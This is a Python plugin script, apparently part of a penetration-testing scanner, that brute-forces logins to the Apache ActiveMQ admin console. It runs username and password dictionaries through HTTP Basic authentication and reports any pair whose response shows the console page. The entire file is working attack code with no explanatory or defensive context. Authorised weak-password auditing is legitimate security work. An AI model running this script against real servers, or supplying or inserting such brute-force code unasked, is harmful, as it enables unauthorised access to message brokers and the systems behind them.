#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.core.env import *
from base64 import b64encode
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.ACTIVEMQ

    def load_dict(self):
        username_txt_path = self.parameter.get("U", None)
        if username_txt_path:
            self.username_list = self.read_file(username_txt_path)
        else:
            self.username_list = self.get_default_dict("activemq_usernames.txt")

        password_txt_path = self.parameter.get("P", None)
        if password_txt_path:
            self.password_list = self.read_file(password_txt_path)
        else:
            self.password_list = self.get_default_dict("activemq_passwords.txt")

    async def prove(self):
        if self.base_url:
            url = self.base_url + "admin/"
            async with ClientSession() as session:
                async with session.get(url=url) as res:
                    if res and res.status == 401:
                        async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list):
                            key = str(b64encode(bytes(":".join([username, password]), 'utf-8')), 'utf-8')
                            headers = {"Authorization": 'Basic %s' % key}
                            try:
                                async with session.get(url=url, headers=headers) as res:
                                    if res:
                                        text = await res.text()
                                        if 'Console' in text:
                                            yield username + "/" + password
                            except:
                                pass

